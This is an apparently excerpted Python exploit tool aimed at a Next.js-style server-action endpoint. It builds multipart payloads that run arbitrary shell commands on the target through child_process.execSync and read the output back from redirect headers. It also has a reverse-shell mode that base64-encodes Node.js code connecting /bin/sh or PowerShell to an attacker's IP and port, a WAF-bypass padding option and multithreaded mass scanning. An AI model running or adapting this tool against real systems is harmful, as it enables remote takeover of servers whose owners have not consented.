...
Edited by https://github.com/guiimoraes
"""
...
def print_banner():
    ...
    banner = f"""
     {Colors.CYAN}                                                                                          d8b 
                                    d8P                                                    88P 
                                 d888888P                                                 d88  
  88bd88b d8888b d888b8b   d8888b  ?88'       d8888b  ?88   d8P  d8P  88bd88b  d8888b d888888  
  88P'  `d8b_,dPd8P' ?88  d8P' `P  88P       d8P' ?88 d88  d8P' d8P'  88P' ?8bd8b_,dPd8P' ?88  
 d88     88b    88b  ,88b 88b      88b       88b  d88 ?8b ,88b ,88'  d88   88P88b    88b  ,88b 
d88'     `?888P'`?88P'`88b`?888P'  `?8b      `?8888P' `?888P'888P'  d88'   88b`?888P'`?88P'`88b
                                                                                               
                                                                                               
                                                                                               
{Colors.CYAN}{Colors.BOLD}brought to you by assetnote{Colors.RESET}
{Colors.CYAN}{Colors.BOLD}edited by https://github.com/guiimoraes{Colors.RESET}
"""
    print(banner)
...
def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, payload: str = 'echo $((41*271))', reverse_shell: tuple[str, int] | None = None) -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if reverse_shell:
        # Reverse shell payload
        ip, port = reverse_shell
        if(windows):
            reverse_shell_code = f"(function(){{ var net = process.mainModule.require('net'), cp = process.mainModule.require('child_process'), sh = cp.spawn('powershell.exe', []); var client = new net.Socket(); client.connect({port}, '{ip}', function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }}); return /a/;}})();"
        else:
            reverse_shell_code = f"(function(){{ var net = process.mainModule.require('net'), cp = process.mainModule.require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect({port}, '{ip}', function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }}); return /a/;}})();"
        # Encode reverse shell code in base64
        payload_b64 = base64.b64encode(reverse_shell_code.encode('utf-8')).decode('utf-8')
        prefix_payload = (
            f"var payload=Buffer.from('{payload_b64}','base64').toString('utf-8');"
            f"eval(payload);"
            f"throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=reverse_shell;307;`}});"
        )
    else:
        ...
        if windows:
            # PowerShell payload - decode base64 and execute
            prefix_payload = (
                f"var payload=Buffer.from('{payload_b64}','base64').toString('utf-8');"
                f"var res=process.mainModule.require('child_process').execSync(payload)"
                f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
                f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
            )
        else:
            # Linux/Unix payload - decode base64 and execute
            prefix_payload = (
                f"var payload=Buffer.from('{payload_b64}','base64').toString('utf-8');"
                f"var res=process.mainModule.require('child_process').execSync(payload)"
                f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
...
def extract_command_result_from_header(redirect_header: str) -> str | None:
    """Extract command result from X-Action-Redirect header."""
    if not redirect_header:
        return None
    
    # Pattern: NEXT_REDIRECT;push;/login?a=<result>;307;
    # Extract the value after /login?a= and before ;
...
def is_vulnerable_rce_check(response: requests.Response) -> bool:
    ...
    # Check for the X-Action-Redirect header and extract command result
    redirect_header = response.headers.get("X-Action-Redirect", "")
    if not redirect_header:
        return False
    
    # Extract command result from the header
    command_result = extract_command_result_from_header(redirect_header)
    
    # If we found a result, it's vulnerable (regardless of the value)
    return command_result is not None and command_result != ""


def extract_command_result(response_text: str) -> str | None:
    """Extract command result from response text in format: 1:E{"digest":"result"}"""
    if not response_text:
        return None
    
    # Look for pattern: 1:E{"digest":"<content>"}
    # Try to match the full pattern first
    match = re.search(r'1:\s*E\{"digest":"([^"]+)"\}', response_text)
    if match:
        return match.group(1)
    
    # Try without the "1:" prefix
    match = re.search(r'E\{"digest":"([^"]+)"\}', response_text)
    if match:
        return match.group(1)
    
    # Try multiline match in case content spans multiple lines
    match = re.search(r'E\{"digest":"(.+?)"\}', response_text, re.DOTALL)
    if match:
...
def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, payload: str = 'echo $((41*271))', reverse_shell: tuple[str, int] | None = None) -> dict:
    """
    ...
    if safe_check:
        ...
        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, payload=payload, reverse_shell=reverse_shell)
    ...
    command_result = extract_command_result(response.text)
    
    # For RCE check, also try to extract from X-Action-Redirect header
    if not safe_check:
        redirect_header = response.headers.get("X-Action-Redirect", "")
        header_result = extract_command_result_from_header(redirect_header)
        if header_result:
...
def print_result(result: dict, verbose: bool = False):
    ...
    if result["vulnerable"] is True:
        ...
        if command_result:
            print(colorize("  Command Result:", Colors.CYAN))
    ...
    if verbose and result["vulnerable"] and not command_result:
...
Examples:
  ...
  %(prog)s -u https://example.com -H "Authorization: Bearer token" -H "User-Agent: CustomAgent"
    ...
    parser.add_argument(
        ...
        type=str,
        default="echo $((41*271))",
        help="Payload to use for RCE (default: echo $((41*271)))"
    )
    parser.add_argument(
        "--reverse-shell",
        type=str,
        metavar="IP:PORT",
        help="Create reverse shell connection to IP:PORT (e.g., 192.168.1.1:1337)"
    )
    ...
    # Parse reverse shell argument
    reverse_shell = None
    if args.reverse_shell:
        try:
            if ":" not in args.reverse_shell:
                print(colorize(f"[ERROR] Invalid reverse shell format. Use IP:PORT (e.g., 192.168.1.1:1337)", Colors.RED))
                sys.exit(1)
            ip, port_str = args.reverse_shell.rsplit(":", 1)
            port = int(port_str)
            if not (1 <= port <= 65535):
                print(colorize(f"[ERROR] Invalid port number. Must be between 1 and 65535", Colors.RED))
                sys.exit(1)
    ...
    if not args.quiet:
        ...
        if reverse_shell:
            print(colorize(f"[*] Reverse shell enabled: {reverse_shell[0]}:{reverse_shell[1]}", Colors.CYAN))
        if args.insecure:
    ...
    if len(hosts) == 1:
        result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, payload=args.payload, reverse_shell=reverse_shell)
        ...
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, payload=args.payload, reverse_shell=reverse_shell): host
                for host in hosts
            }
